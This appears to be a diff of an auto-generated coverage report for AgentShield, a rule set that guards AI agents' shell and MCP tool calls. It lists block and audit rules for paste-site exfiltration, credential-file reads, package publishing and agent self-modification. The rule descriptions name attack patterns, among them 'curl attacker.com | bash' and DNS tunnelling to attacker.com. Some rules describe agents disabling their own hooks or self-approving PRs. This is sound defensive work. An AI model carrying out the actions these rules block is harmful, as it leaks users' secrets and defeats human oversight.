@@ -1,15 +1,15 @@
 # AgentShield Coverage Report
 
-*Auto-generated on 2026-04-09 by `go run ./cmd/coverage`*
+*Auto-generated on 2026-04-10 by `go run ./cmd/coverage`*
 
 ## Summary
 
 | Metric | Count |
 |--------|-------|
-| Terminal rules | 1110 |
-| MCP rules | 781 |
-| Total rules | 1891 |
-| Test cases (TP+TN) | 4044 |
+| Terminal rules | 1118 |
+| MCP rules | 806 |
+| Total rules | 1924 |
+| Test cases (TP+TN) | 4058 |
 | Kingdoms covered | 10 |
 
 ## Runtime Rules by Kingdom
@@ -201,7 +201,7 @@
 | `ne-audit-teams-webhook` | AUDIT | regex | Microsoft Teams webhook call detected. Review the payload to ensure the agent is not exfiltrating data to an attacker-controlled Teams channel. MITRE T1567.002. |
 | `ne-block-gh-gist-credential-exfil` | BLOCK | regex | gh gist create targeting a credential or key file detected. Uploading SSH keys, AWS credentials, or .env files to GitHub Gist exposes secrets publicly (or to authenticated GitHub users). AI agents have no legitimate reason to gist credential files. MITRE T1567.001, CWE-312. |
 | `ne-audit-gh-gist-create-public` | AUDIT | regex | gh gist create --public detected. AI agent autonomously publishing files as public GitHub Gists is unusual — verify the file contents do not include secrets, internal paths, or sensitive source code. MITRE T1567.001. |
-| `ne-block-paste-site-upload` | BLOCK | regex | Upload to an anonymous paste site detected (termbin, ix.io, 0x0.st, hastebin, ghostbin, sprunge, pastebin API). These services require no authentication and are commonly used for one-way data exfiltration — attackers retrieve the paste via a short URL. AI agents have no legitimate need to upload content to anonymous paste services. MITRE T1567.003. |
+| `ne-block-paste-site-upload` | BLOCK | regex | Upload to an anonymous paste site detected (termbin, ix.io, 0x0.st, hastebin, ghostbin, sprunge, pastebin API, transfer.sh, dpaste.com, bpaste.net). These services require no authentication and are commonly used for one-way data exfiltration — attackers retrieve the paste via a short URL. Covers curl -F, -d @, -T/--upload-file upload flags. AI agents have no legitimate need to upload content to anonymous paste services. MITRE T1567.003. |
 | `ne-audit-python-http-server` | AUDIT | regex | Python HTTP file server detected. This exposes the working directory over the network, enabling passive data exfiltration. Confirm this is intentional local development and not a response to prompt injection. MITRE T1105, T1041. |
 | `ne-audit-npx-http-server` | AUDIT | regex | npx HTTP file server (http-server/serve) detected. This exposes the working directory over the network to any peer with access to the port. Confirm intent is legitimate development, not staged exfiltration. MITRE T1105. |
 | `ne-audit-ruby-http-server` | AUDIT | regex | Ruby one-liner HTTP file server detected (ruby -run -e httpd). Exposes the current directory to network peers. Review whether this was triggered by a prompt injection attack. MITRE T1105. |
@@ -440,7 +440,7 @@
 | `ts-audit-scope-creep-aws-multi-create` | AUDIT | regex | Three or more chained AWS resource-creation operations detected — an AI agent autonomously provisioning IAM roles, S3 buckets, log groups, and other cloud resources in a single compound command exceeds typical task scope (OWASP LLM06 Excessive Agency, EU AI Act Art.14). |
 | `ts-audit-scope-creep-home-config-scan` | AUDIT | regex | find scanning the entire home directory for configuration file extensions (yaml, json, toml, ini, conf) is AI agent scope creep — collecting environmental context far beyond any single task's authorized scope. Configuration files in the home directory frequently contain API tokens, database URLs, and service credentials (OWASP LLM06, EU AI Act Art.14). |
 | `gr-block-gh-pr-merge-admin` | BLOCK | regex | gh pr merge --admin bypasses required branch protection reviews via admin override. An AI agent using this flag removes the human verification gate entirely, allowing unreviewed code to reach production (OWASP LLM06, MITRE ATLAS AML.T0056). |
-| `gr-audit-gh-pr-self-approve` | AUDIT | regex | gh pr review --approve — an AI agent approving a pull request removes the independent human review requirement. When agents author and self-approve PRs, no human verifies the changes before merge (OWASP LLM06). |
+| `gr-audit-gh-pr-self-approve` | AUDIT | regex | gh pr review --approve — fires on ANY PR approval from the terminal, not just self-approvals (the shell layer has no signal about whether the approver is the PR author). AI agents approving pull requests removes independent human review of agent-authored changes (OWASP LLM06). Operators receiving audit noise from human developers can add targeted allow-list entries. |
 
 ### persistence-evasion (159 rules)
 
@@ -826,7 +826,7 @@
 | `ts-audit-ldapsearch` | AUDIT | regex | ldapsearch invocation detected. LDAP queries may be legitimate (connectivity testing, operational lookups) but warrant monitoring when run by AI agents. Broad domain-enumeration patterns are blocked separately by ts-block-ldapsearch-domain-enum. OWASP LLM02, CWE-200. |
 | `sec-df-block-ai-config-exfil` | BLOCK | dataflow | Dataflow: AI IDE config file piped to network — exfiltrates system prompts, MCP server config, and security controls (OWASP LLM06, MITRE T1552, T1041). |
 
-### supply-chain (135 rules)
+### supply-chain (143 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -920,9 +920,17 @@
 | `sc-block-twine-upload` | BLOCK | regex | twine upload publishes Python packages to PyPI or a private index. Autonomous PyPI publishing by an AI agent is a supply chain attack vector — once published, malicious code is immediately installable by any pip user. MITRE T1195.001. |
 | `sc-block-cargo-publish` | BLOCK | structural | cargo publish uploads a Rust crate to crates.io. AI agents must not autonomously publish Rust packages — crates.io releases are permanent and immediately available to all Cargo users worldwide. MITRE T1195.001. |
 | `sc-block-gem-push` | BLOCK | structural | gem push publishes a Ruby gem to rubygems.org. Autonomous gem publishing by an AI agent exposes the Ruby ecosystem to supply chain compromise. MITRE T1195.001. |
+| `sc-block-npm-publish-sudo` | BLOCK | regex | sudo npm publish uploads the package to the npm registry as root. An AI agent must never autonomously publish a package — a single prompt-injected publish can distribute backdoored code to millions of users. MITRE T1195.001. |
+| `sc-block-cargo-publish-sudo` | BLOCK | regex | sudo cargo publish uploads a Rust crate to crates.io as root. AI agents must not autonomously publish Rust packages — crates.io releases are permanent and immediately available to all Cargo users worldwide. MITRE T1195.001. |
+| `sc-block-gem-push-sudo` | BLOCK | regex | sudo gem push publishes a Ruby gem to rubygems.org as root. Autonomous gem publishing by an AI agent exposes the Ruby ecosystem to supply chain compromise. MITRE T1195.001. |
 | `sc-block-nuget-push` | BLOCK | regex | dotnet nuget push / nuget push publishes a .NET package to nuget.org or a configured feed. AI agents must never autonomously push NuGet packages — a compromised release affects all .NET projects using that package. MITRE T1195.001. |
-| `sc-block-docker-push` | BLOCK | regex | docker push / docker buildx push autonomously publishes a container image to a registry. A pushed image becomes a base layer for downstream builds and is immediately pulled by rolling deployments — a single autonomous push can distribute malicious code to all consumers of that image. MITRE T1195.001, T1610. |
-| `sc-block-maven-deploy` | BLOCK | regex | mvn deploy / mvn release:perform / gradle publish autonomously publishes Java artifacts to Maven repositories. Published JARs become transitive dependencies in thousands of downstream projects and Gradle plugins execute as code in every adopter's build — a single autonomous publish can distribute malicious bytecode across the entire Java ecosystem. MITRE T1195.001. |
+| `sc-audit-docker-push` | AUDIT | regex | docker push / docker buildx push publishes a container image to a registry. Routine in CI/CD — AUDIT for supply-chain visibility; verify target registry and tag are the intended scope. MITRE T1195.001, T1610. |
+| `sc-audit-crane-push` | AUDIT | regex | crane is a single-binary OCI registry client commonly used in CI to push images without Docker. Routine in distroless/minimal pipelines — AUDIT for supply-chain visibility. MITRE T1195.001. |
+| `sc-audit-skopeo-copy` | AUDIT | regex | skopeo copy with a docker:// destination transfers an image into a container registry. Legitimate in air-gapped/migration workflows — AUDIT for supply-chain visibility. MITRE T1195.001. |
+| `sc-audit-podman-push` | AUDIT | regex | podman push publishes a container image to a registry. Functional equivalent of docker push in rootless/RHEL workflows — AUDIT for supply-chain visibility. MITRE T1195.001. |
+| `sc-audit-regctl-image-copy` | AUDIT | regex | regctl image copy moves an image between OCI registries. Used in mirroring and release-promotion workflows — AUDIT for supply-chain visibility. MITRE T1195.001. |
+| `sc-block-maven-central-release` | BLOCK | regex | mvn release:perform / gradle publishToMavenCentral is the ecosystem-wide Java artifact release orchestration — it tags, builds, signs, and uploads to Maven Central in a single unattended step. Autonomous execution can publish backdoored JARs that propagate as transitive dependencies across the Java ecosystem. MITRE T1195.001. |
+| `sc-audit-maven-deploy` | AUDIT | regex | mvn deploy / gradle publish uploads a build artifact to a configured Maven repository (typically Nexus, Artifactory, or an internal mirror). Routine in enterprise CI — AUDIT for supply-chain visibility. Note publishToMavenLocal is excluded (writes only to ~/.m2, no network). MITRE T1195.001. |
 | `sc-block-github-path-injection` | BLOCK | regex | Writing to $GITHUB_PATH prepends directories to $PATH for all subsequent GitHub Actions steps — enables malicious binary substitution (PATH hijacking). Any legitimate tool invoked in later steps may call attacker-controlled code. MITRE T1574.007, OWASP LLM08. |
 | `sc-audit-github-env-injection` | AUDIT | regex | Writing to $GITHUB_ENV sets environment variables for subsequent GitHub Actions steps — can override CI secrets or inject credentials. Legitimate uses exist but agent-generated writes warrant human review. MITRE T1611, OWASP LLM08. |
 | `sc-audit-github-output-injection` | AUDIT | regex | Writing to $GITHUB_OUTPUT sets step output variables consumed by subsequent GitHub Actions jobs — can inject attacker-controlled values into deployment logic or approval gates. Legitimate uses exist but agent-generated writes warrant human review. MITRE T1611, OWASP LLM08. |
@@ -1176,7 +1184,7 @@
 
 ## MCP Rules
 
-### credential-exposure (416 rules)
+### credential-exposure (437 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -1211,6 +1219,13 @@
 | `mcp-sec-block-ssh-config-read` | BLOCK | mcp_rule | Read access to SSH config (~/.ssh/config) is blocked — reveals server hostnames, usernames, identity files, and proxy configurations. MITRE T1552, T1087. |
 | `mcp-sec-block-ssh-dir-read` | BLOCK | mcp_rule | Read access to SSH directory (~/.ssh/) is blocked — may contain SSH private keys, config, and authorization data. MITRE T1552.004. |
 | `mcp-sec-block-ssh-authorized-keys-read` | BLOCK | mcp_rule | Read access to SSH authorized_keys is blocked — lists all public keys authorized to log in, useful for lateral movement. MITRE T1087, T1552. |
+| `mcp-sec-block-ssh-access-xdg` | BLOCK | mcp_rule | Write access to the OpenSSH XDG key directory (~/.config/ssh/) is blocked — modifications can install backdoors (authorized_keys) or redirect connections (config). MITRE T1098.004, T1552.004. |
+| `mcp-sec-block-ssh-private-key-read-xdg` | BLOCK | mcp_rule | Read access to SSH private key (id_rsa) in the OpenSSH XDG key directory (~/.config/ssh/) is blocked — private keys enable impersonating the user on all servers they have access to. MITRE T1552.004. |
+| `mcp-sec-block-ssh-ed25519-key-read-xdg` | BLOCK | mcp_rule | Read access to SSH private key (id_ed25519) in the OpenSSH XDG key directory (~/.config/ssh/) is blocked — private keys enable impersonating the user on all servers they have access to. MITRE T1552.004. |
+| `mcp-sec-block-ssh-ecdsa-key-read-xdg` | BLOCK | mcp_rule | Read access to SSH private key (id_ecdsa) in the OpenSSH XDG key directory (~/.config/ssh/) is blocked — private keys enable impersonating the user on all servers they have access to. MITRE T1552.004. |
+| `mcp-sec-block-ssh-config-read-xdg` | BLOCK | mcp_rule | Read access to SSH config (~/.config/ssh/config XDG path) is blocked — reveals server hostnames, usernames, identity files, and proxy configurations. MITRE T1552, T1087. |
+| `mcp-sec-block-ssh-dir-read-xdg` | BLOCK | mcp_rule | Read access to the OpenSSH XDG key directory (~/.config/ssh/) is blocked — may contain SSH private keys, config, and authorization data. MITRE T1552.004. |
+| `mcp-sec-block-ssh-authorized-keys-read-xdg` | BLOCK | mcp_rule | Read access to SSH authorized_keys in the XDG key directory (~/.config/ssh/) is blocked — lists all public keys authorized to log in, useful for lateral movement. MITRE T1087, T1552. |
 | `mcp-sec-block-aws-access` | BLOCK | mcp_rule | Access to AWS credential directories is blocked. |
 | `mcp-sec-block-gnupg-access` | BLOCK | mcp_rule | Access to GPG key directories is blocked. |
 | `mcp-sec-block-google-authenticator-read` | BLOCK | mcp_rule | Read access to ~/.google_authenticator is blocked — this file contains the HMAC seed secret for TOTP/HOTP MFA. An attacker who reads this file can generate valid one-time passwords and bypass multi-factor authentication. MITRE T1552. |
@@ -1240,10 +1255,14 @@
 | `mcp-sec-block-scaleway-cli-credentials` | BLOCK | mcp_rule | Access to Scaleway CLI config (~/.config/scw/) is blocked — contains access key and secret key granting full Scaleway cloud account control. MITRE T1552.005. |
 | `mcp-sec-block-vultr-cli-credentials` | BLOCK | mcp_rule | Access to Vultr CLI config (~/.config/vultr-cli/) is blocked — contains API key granting full Vultr cloud account access (VPS, Kubernetes, DNS). MITRE T1552.005. |
 | `mcp-sec-block-ionosctl-credentials` | BLOCK | mcp_rule | Access to IONOS Cloud CLI config (~/.ionosctl/) is blocked — contains credentials (username/password or token) granting full IONOS Cloud account access. MITRE T1552.001. |
-| `mcp-sec-block-dotenv-read` | BLOCK | mcp_rule | Access to .env files is blocked — these routinely contain API keys, database passwords, OAuth secrets, and other plaintext credentials. MITRE T1552.001. |
-| `mcp-sec-block-dotenv-variants-read` | BLOCK | mcp_rule | Access to .env variant files (.env.local, .env.production, etc.) is blocked — these contain environment-specific API keys and plaintext credentials. MITRE T1552.001. |
-| `mcp-sec-block-envrc-read` | BLOCK | mcp_rule | Access to .envrc (direnv config) is blocked — commonly exports API keys and sensitive credentials as environment variables. MITRE T1552.001. |
-| `mcp-sec-block-non-dotfile-env-read` | BLOCK | mcp_rule | Access to non-dotfile *.env file is blocked — files with a .env suffix (secrets.env, credentials.env, app.env) are used by Docker Compose, Kubernetes envFrom, and CI/CD pipelines to store plaintext API keys and credentials. MITRE T1552.001. |
+| `mcp-sec-block-dotenv-read` | BLOCK | mcp_rule | Read access to .env files is blocked — these routinely contain API keys, database passwords, OAuth secrets, and other plaintext credentials. MITRE T1552.001. |
+| `mcp-sec-audit-dotenv-write` | AUDIT | mcp_rule | Write to .env file audited — legitimate during project scaffolding, but worth logging for review. Content-level credential injection is handled by the content scanner. |
+| `mcp-sec-block-dotenv-variants-read` | BLOCK | mcp_rule | Read access to .env variant files (.env.local, .env.production, etc.) is blocked — these contain environment-specific API keys and plaintext credentials. MITRE T1552.001. |
+| `mcp-sec-audit-dotenv-variants-write` | AUDIT | mcp_rule | Write to .env variant file audited — legitimate during environment setup (e.g., .env.local, .env.production), but worth logging. Content-level credential injection is handled by the content scanner. |
+| `mcp-sec-block-envrc-read` | BLOCK | mcp_rule | Read access to .envrc (direnv config) is blocked — commonly exports API keys and sensitive credentials as environment variables. MITRE T1552.001. |
+| `mcp-sec-audit-envrc-write` | AUDIT | mcp_rule | Write to .envrc (direnv config) audited — the core direnv setup workflow writes this file. Content-level credential injection is handled by the content scanner. |
+| `mcp-sec-audit-non-dotfile-env-read` | AUDIT | mcp_rule | Access to high-signal credential file (secrets.env / credentials.env pattern) audited — these non-dotfile .env files are commonly used by Docker Compose and CI/CD to store plaintext credentials. MITRE T1552.001. |
+| `mcp-sec-audit-non-dotfile-credential-env-read` | AUDIT | mcp_rule | Access to credential-named .env file audited — non-dotfile .env files with 'credential' in the basename (credentials.env, app-credentials.env) commonly store plaintext API keys. MITRE T1552.001. |
 | `mcp-sec-block-git-credentials` | BLOCK | mcp_rule | Git credential file access is blocked — contains plaintext credentials; writes can redirect git auth to attacker-controlled hosts. |
 | `mcp-sec-block-git-credentials-xdg` | BLOCK | mcp_rule | XDG git credential file access is blocked — ~/.config/git/credentials contains the same plaintext HTTP credentials as ~/.git-credentials (XDG Base Directory spec location). |
 | `mcp-sec-block-git-credential-manager` | BLOCK | mcp_rule | Access to git-credential-manager config directory is blocked — contains OAuth tokens for GitHub, GitLab, Azure DevOps, and Bitbucket that grant full API access without a password. MITRE T1552.001. |
@@ -1257,6 +1276,11 @@
 | `mcp-sec-block-credential-uri-dsn` | BLOCK | mcp_rule | MCP tool call contains a database URI with embedded credentials in the 'dsn' argument — plaintext passwords in tool arguments are exposed in audit logs, MCP wire traffic, and prompt context. MITRE T1552.001. |
 | `mcp-sec-block-credential-uri-database-url` | BLOCK | mcp_rule | MCP tool call contains a database URI with embedded credentials in the 'database_url' argument — plaintext passwords in tool arguments are exposed in audit logs, MCP wire traffic, and prompt context. MITRE T1552.001. |
 | `mcp-sec-block-credential-uri-db-url` | BLOCK | mcp_rule | MCP tool call contains a database URI with embedded credentials in the 'db_url' argument — plaintext passwords in tool arguments are exposed in audit logs, MCP wire traffic, and prompt context. MITRE T1552.001. |
+| `mcp-sec-block-credential-uri-url` | BLOCK | mcp_rule | MCP tool call contains a database URI with embedded credentials in the 'url' argument (SQLAlchemy convention) — plaintext passwords in tool arguments are exposed in audit logs, MCP wire traffic, and prompt context. MITRE T1552.001. |
+| `mcp-sec-block-credential-uri-conn` | BLOCK | mcp_rule | MCP tool call contains a database URI with embedded credentials in the 'conn' argument — plaintext passwords in tool arguments are exposed in audit logs, MCP wire traffic, and prompt context. MITRE T1552.001. |
+| `mcp-sec-block-credential-uri-connection-uri` | BLOCK | mcp_rule | MCP tool call contains a database URI with embedded credentials in the 'connection_uri' argument — plaintext passwords in tool arguments are exposed in audit logs, MCP wire traffic, and prompt context. MITRE T1552.001. |
+| `mcp-sec-block-credential-uri-jdbc-url` | BLOCK | mcp_rule | MCP tool call contains a database URI with embedded credentials in the 'jdbc_url' argument — plaintext passwords in tool arguments are exposed in audit logs, MCP wire traffic, and prompt context. MITRE T1552.001. |
+| `mcp-sec-block-credential-uri-db-connection` | BLOCK | mcp_rule | MCP tool call contains a database URI with embedded credentials in the 'db_connection' argument (Ruby/Rails tooling convention) — plaintext passwords in tool arguments are exposed in audit logs, MCP wire traffic, and prompt context. MITRE T1552.001. |
 | `mcp-sec-block-jetbrains-security-xml` | BLOCK | mcp_rule | Access to JetBrains IDE security.xml is blocked — this file contains the master password hash protecting the IDE's credential store (database passwords, server logins, OAuth tokens). MITRE T1552.001. |
 | `mcp-sec-block-jetbrains-master-password` | BLOCK | mcp_rule | Access to JetBrains masterPassword.xml is blocked — stores the encrypted master password protecting the IDE credential store (database passwords, server logins, OAuth tokens). MITRE T1552.001. |
 | `mcp-sec-block-jetbrains-web-servers` | BLOCK | mcp_rule | Access to JetBrains webServers.xml is blocked — contains FTP/SFTP/web server connection credentials stored by the IDE deployment/remote host configuration. MITRE T1552.001. |
@@ -1593,6 +1617,11 @@
 | `mcp-sec-block-mongodb-uri` | BLOCK | resource_rule | Direct MongoDB access via MCP is blocked. |
 | `mcp-sec-block-ssh-uri` | BLOCK | resource_rule | Resource read of SSH key files is blocked. |
 | `mcp-sec-block-aws-uri` | BLOCK | resource_rule | Resource read of AWS credential files is blocked. |
+| `mcp-sec-block-jfrog-xdg-config` | BLOCK | mcp_rule | Access to ~/.config/jfrog/ is blocked — JFrog CLI v6+ stores API keys, access tokens, and server credentials here following the XDG base directory convention. Exfiltration enables publishing malicious artifacts to private Artifactory registries and supply chain attacks. MITRE T1552.001, T1195.001. |
+| `mcp-sec-block-atlassian-config` | BLOCK | mcp_rule | Access to ~/.config/atlassian/ is blocked — contains Atlassian CLI OAuth tokens and personal access tokens granting full Jira and Confluence API access. MITRE T1552.001. |
+| `mcp-sec-block-jupyter-xdg-config` | BLOCK | mcp_rule | Access to ~/.config/jupyter/ is blocked — Jupyter server config (XDG path) stores authentication tokens and passwords. Reading exposes credentials for notebook code execution; writing can disable authentication entirely. MITRE T1552.001, T1546. |
+| `mcp-sec-block-doppler-legacy-config` | BLOCK | mcp_rule | Access to ~/.doppler/ is blocked — legacy Doppler CLI config directory contains personal access tokens and scoped service tokens granting read access to all managed secrets across all configured projects. MITRE T1552.001. |
+| `mcp-sec-block-aliyun-credentials` | BLOCK | mcp_rule | Access to ~/.aliyun/ is blocked — contains Alibaba Cloud (Aliyun) CLI credentials including Access Key ID and Secret that grant full cloud control (ECS, OSS, RDS, RAM). MITRE T1552.001. |
 | `mcp-sec-block-braintree-config-dir` | BLOCK | mcp_rule | Access to ~/.config/braintree/ is blocked — contains Braintree merchant credentials (merchant ID, public key, private key) enabling unauthorized payment operations. MITRE T1552.001. |
 | `mcp-sec-block-square-home-dir` | BLOCK | mcp_rule | Access to ~/.square/ is blocked — contains Square CLI OAuth tokens and app credentials authorizing point-of-sale and payment API operations. MITRE T1552.001. |
 | `mcp-sec-block-adyen-creds` | BLOCK | mcp_rule | Access to ~/.adyen/ is blocked — contains Adyen API keys and HMAC secrets enabling unauthorized payment operations and webhook signature forgery. MITRE T1552.001. |
@@ -1725,7 +1754,7 @@
 | `blocked-tool:eval_code` | BLOCK | blocked_tool | Tool 'eval_code' is blocked by default. |
 | `blocked-tool:exec_code` | BLOCK | blocked_tool | Tool 'exec_code' is blocked by default. |
 
-### persistence-evasion (34 rules)
+### persistence-evasion (35 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -1747,7 +1776,8 @@
 | `mcp-persist-audit-instruction-file-write` | AUDIT | structural | MCP write to AI agent instruction or memory file — injecting malicious instructions poisons future agent sessions (persistent inter-session prompt injection). Covers Claude Code, Cursor, Windsurf, Gemini CLI, Codex, Cline, Roo, Copilot, Continue.dev, Aider. OWASP LLM01/LLM08. |
 | `mcp-persist-block-gitconfig-write` | BLOCK | structural | MCP write to ~/.gitconfig or its XDG equivalent (~/.config/git/config) can inject core.hooksPath to redirect all git hooks to attacker scripts, or url.insteadOf to intercept git credentials. Persistent execution without elevated privileges. MITRE T1546. |
 | `mcp-persist-block-git-repo-config-write` | BLOCK | structural | MCP write to .git/config (project-level git config) can redirect git hooks to attacker scripts or intercept git credentials via url.insteadOf. Persistent execution without elevated privileges. MITRE T1546. |
-| `mcp-persist-block-ide-settings-write` | BLOCK | structural | MCP write to AI IDE settings file — an agent that modifies its own settings.json can self-grant Bash(*), add malicious MCP servers, or disable AgentShield hooks without human authorization. Capability escalation via config injection. OWASP LLM06, MITRE T1548. |
+| `mcp-persist-block-ide-settings-write` | BLOCK | structural | MCP write to AI IDE settings or hooks file — an agent that modifies settings.json can self-grant Bash(*), add malicious MCP servers, or disable AgentShield. Writing hooks.json without the AgentShield PreToolUse hook silently disables all runtime protections for future sessions (self-protection bypass). OWASP LLM06, MITRE T1548. |
+| `mcp-persist-block-claude-commands-write` | BLOCK | structural | MCP write to ~/.claude/commands/ — injects a persistent global slash command into every future Claude Code session. Any .md file written here becomes a slash command available across all projects, achieving inter-session prompt injection. OWASP LLM01/LLM08, MITRE T1546. |
 | `mcp-persist-block-ide-keybindings-write` | BLOCK | structural | MCP write to IDE keybindings file — an agent can install keyboard shortcuts that execute shell commands on every key press (e.g., Ctrl+S → curl attacker.com \| bash), establishing persistent code execution without modifying settings.json or any monitored permission file. MITRE T1546.004, T1059, OWASP LLM06. |
 | `mcp-persist-block-security-config-delete` | BLOCK | structural | MCP deletion of AI IDE settings or AgentShield config removes hooks and policy, silently disabling all runtime protections. An agent that deletes its own settings.json can bypass AgentShield for all subsequent commands in the session. OWASP LLM06, MITRE T1548, T1485. |
 | `mcp-persist-block-desktop-extension-write` | BLOCK | structural | MCP write to desktop environment extension directory — installs a GNOME/Cinnamon/KDE extension that executes code in the desktop session process on every login. Persistent execution without elevated privileges. MITRE T1547. |
@@ -1797,7 +1827,7 @@
 | `mcp-struct-block-privesc-permissions` | BLOCK | structural | Privilege escalation — permission change on system-critical path |
 | `mcp-struct-block-auth-bypass` | BLOCK | structural | Privilege escalation — attempt to disable authentication via config modification |
 
-### reconnaissance (35 rules)
+### reconnaissance (36 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -1836,8 +1866,9 @@
 | `mcp-recon-block-grep-aws-key-pattern` | BLOCK | structural | MCP content-search with credential pattern — searching for AWS key prefixes, PEM headers, or service-specific token patterns across the filesystem is credential-hunting reconnaissance. No legitimate development task requires searching for these literal credential patterns. MITRE T1552, T1552.001. |
 | `mcp-recon-audit-grep-credential-patterns` | AUDIT | structural | MCP content-search with generic credential pattern — searching for password assignments, API key patterns, or private key references across files may indicate credential harvesting. MITRE T1552.001. |
 | `mcp-recon-audit-ide-extension-enum` | AUDIT | structural | MCP directory listing of IDE extensions — reveals installed extensions including AI assistants, credential managers, and cloud integrations. Enables targeted attacks against extension-specific credential stores. MITRE T1518, T1083. |
+| `mcp-recon-block-windsurf-mcp-server-config-read` | BLOCK | structural | Read access to mcp_server_config.json is blocked — Windsurf IDE's MCP server configuration contains server URLs, API key references, and environment variables with secrets. Reading this file reveals connected services and enables targeted follow-up attacks. Mirrors cursor/mcp.json and claude_desktop_config.json protection. MITRE T1552, T1539. |
 
-### supply-chain (35 rules)
+### supply-chain (37 rules)
 
 | Rule ID | Decision | Match Type | Description |
 |---------|----------|------------|-------------|
@@ -1876,6 +1907,8 @@
 | `mcp-sc-block-go-bin-write` | BLOCK | structural | MCP write to Go binary install directory (~/go/bin/) — GOPATH/bin is on PATH after standard Go installation. Writing any binary here enables persistent code execution on every tool invocation, bypassing shell-level rules entirely. MITRE T1574.007, T1195.001. |
 | `mcp-sc-block-maven-gradle-cache-write` | BLOCK | structural | MCP write to Maven local repository or Gradle module cache — both build tools resolve artifacts from local cache first. Injecting a malicious JAR into ~/.m2/ or ~/.gradle/caches/ silently backdoors all Java/Kotlin projects on the machine without any network trace or checksum alert. MITRE T1195.001, T1565.001. |
 | `mcp-sc-block-codeowners-delete` | BLOCK | structural | MCP delete of CODEOWNERS — removing code ownership gates eliminates mandatory reviewer requirements across the entire repository, enabling subsequent malicious changes to bypass human review silently. Deletion is as dangerous as modification. MITRE T1195.002. |
+| `mcp-sc-audit-bun-shell-template-write` | AUDIT | structural | MCP file write contains a Bun shell tagged template literal with variable interpolation (Bun.$`${...}`). Semgrep cannot track taint through this syntax (todoruleid gap in ai-llm-output-bun-shell). When LLM output flows through the interpolated variable, the Bun subprocess executes attacker-controlled shell commands. Runtime shell layer provides primary protection at exec time; this rule provides write-time visibility. MITRE T1059. |
+| `mcp-sc-block-js-runtime-bin-write` | BLOCK | structural | MCP write to JS/Deno runtime binary directory — these directories (~/.bun/bin/, ~/.volta/bin/, ~/.deno/bin/, ~/.fnm/node-versions/) are managed by the runtime and placed in $PATH. Writing here installs a trojaned binary that executes on every runtime invocation, achieving persistent code execution without elevated privileges. MITRE T1554, T1574.007. |
 
 ### unauthorized-execution (105 rules)
 
@@ -2002,7 +2035,7 @@
 | `mcp-response-integrity-struct-block-webhook-exfil` | BLOCK | structural | MCP network tool targeting a chat/webhook service — Discord API webhooks, Slack incoming webhooks, Teams webhooks, Telegram bots, Pipedream, and ntfy.sh are primary exfiltration channels for AI agents. MITRE T1567.002. |
 | `mcp-response-integrity-struct-audit-credential-url` | AUDIT | structural | Fetch URL contains credential-like query parameters — audit for response poisoning exfiltration (LLM06) |
 | `mcp-data-exfil-block-doh-endpoints` | BLOCK | structural | MCP HTTP tool targeting a DNS-over-HTTPS resolver endpoint — AI agents have no legitimate need to call DoH APIs. Data exfiltrated as subdomain labels (e.g., base32(secret).attacker.com) tunneled through HTTPS bypasses all DNS-layer monitoring. MITRE T1071.004, T1048.003. |
-| `mcp-data-exfil-block-doh-content-type` | BLOCK | structural | MCP HTTP tool request using DNS-over-HTTPS wire format content type (application/dns-json or application/dns-message) — indicates a DoH resolver call regardless of destination, used to exfiltrate data as DNS queries tunneled through HTTPS. MITRE T1071.004, T1048.003. |
+| `mcp-data-exfil-block-doh-content-type` | BLOCK | structural | MCP HTTP tool request with DNS-over-HTTPS wire format content type (application/dns-json or application/dns-message) in headers — indicates a DoH resolver call regardless of destination, used to exfiltrate data as DNS queries tunneled through HTTPS. MITRE T1071.004, T1048.003. |
 | `mcp-safety-block-tool-uri-ssrf-imds` | BLOCK | structural | SSRF via tool 'uri' argument — request to cloud metadata endpoint leaks IAM credentials and cloud instance metadata. MITRE T1552.007, OWASP LLM08. |
 | `mcp-safety-block-tool-uri-ssrf-localhost` | BLOCK | structural | SSRF via tool 'uri' argument — request to localhost/loopback service allows attacker to probe or exfiltrate data from internal services. MITRE T1090, OWASP LLM08. |
 | `mcp-sec-block-altcoin-wallet` | BLOCK | structural | Access to altcoin wallet file is blocked — wallet.dat in Dogecoin, Litecoin, Zcash, and similar Bitcoin-derived wallets contains encrypted private keys. MITRE T1552.001. |
@@ -2017,13 +2050,13 @@
 | Kingdom | TP | TN | Total |
 |---------|----|----|-------|
 | credential-exposure | 292 | 221 | 513 |
-| data-exfiltration | 323 | 210 | 533 |
+| data-exfiltration | 327 | 211 | 538 |
 | destructive-ops | 135 | 100 | 235 |
-| governance-risk | 86 | 69 | 155 |
+| governance-risk | 86 | 71 | 157 |
 | persistence-evasion | 344 | 220 | 564 |
 | privilege-escalation | 302 | 184 | 486 |
 | reconnaissance | 210 | 101 | 311 |
-| supply-chain | 261 | 187 | 448 |
+| supply-chain | 264 | 191 | 455 |
 | unauthorized-execution | 471 | 328 | 799 |
-| **Total** | **2424** | **1620** | **4044** |
+| **Total** | **2431** | **1627** | **4058** |
 
